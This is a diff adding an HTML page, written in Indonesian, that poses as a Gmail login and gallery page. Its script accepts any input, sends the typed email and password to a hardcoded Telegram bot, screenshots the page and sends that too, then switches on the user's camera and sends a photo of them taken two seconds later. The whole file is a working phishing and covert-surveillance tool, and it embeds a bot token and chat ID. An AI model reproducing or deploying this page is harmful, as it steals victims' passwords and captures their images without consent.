@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login dan Galeri</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            padding: 20px;
+        }
+        .login-container {
+            background-color: #1e1e1e;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        .input-group {
+            margin-bottom: 1rem;
+            position: relative;
+        }
+        .input-group i {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+        }
+        input {
+            width: 100%;
+            padding: 10px 10px 10px 35px;
+            border: none;
+            background-color: #333;
+            color: #fff;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .gallery {
+            display: none;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        video {
+            display: none;
+        }
+        img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div id="loginPage">
+            <div class="login-container">
+                <h1>Login</h1>
+                <form id="loginForm">
+                    <div class="input-group">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="username" placeholder="Masukan Gmail" required>
+                    </div>
+                    <div class="input-group">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" id="password" placeholder="Masukan Password" required>
+                    </div>
+                    <button type="submit">Login</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="galleryPage" class="gallery" style="display: none;">
+            <h2>Galeri</h2>
+            <video id="video" autoplay></video>
+            <img id="photo" src="" alt="Gambar User" style="display:none;">
+        </div>
+    </div>
+
+    <script>
+        const botToken = '7319543958:AAGXFewhGrTyQ0uePRKq2ae147xzzdwxc_Y'; // Ganti dengan token bot Telegram Anda
+        const chatId = '6231688254'; // Ganti dengan ID chat tujuan
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Menampilkan halaman galeri tanpa batasan username dan password
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('galleryPage').style.display = 'grid';
+
+            // Kirim hasil login ke Telegram
+            const loginMessage = `User: ${username}\nPassword: ${password}\nStatus: Berhasil login`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: loginMessage
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Hasil login berhasil dikirim ke Telegram');
+                } else {
+                    console.error('Gagal mengirim hasil login ke Telegram');
+                }
+            });
+
+            // Ambil screenshot halaman
+            html2canvas(document.body).then(function(canvas) {
+                canvas.toBlob(function(blob) {
+                    let formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'screenshot.png');
+                    formData.append('caption', `User ${username} berhasil login.`);
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => {
+                        if (response.ok) {
+                            console.log('Gambar dan login berhasil dikirim ke Telegram');
+                        } else {
+                            console.error('Gagal mengirim gambar ke Telegram');
+                        }
+                    });
+                });
+            });
+
+            // Akses kamera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.style.display = 'block';
+
+                    // Ambil gambar secara otomatis setelah 2 detik
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/png');
+
+                        // Kirim gambar user ke Telegram
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                photo: imageData
+                            }),
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                        }).then(response => {
+                            if (response.ok) {
+                                console.log('Gambar user berhasil dikirim ke Telegram');
+                            } else {
+                                console.error('Gagal mengirim gambar user ke Telegram');
+                            }
+                        });
+
+                        // Tampilkan gambar di halaman
+                        const photo = document.getElementById('photo');
+                        photo.src = imageData;
+                        photo.style.display = 'block';
+
+                        // Stop the video stream after taking the picture
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 2000); // Gambar diambil setelah 2 detik
+                })
+                .catch(err => {
+                    console.error('Error accessing camera: ', err);
+                });
+        });
+    </script>
+</body>
+</html>
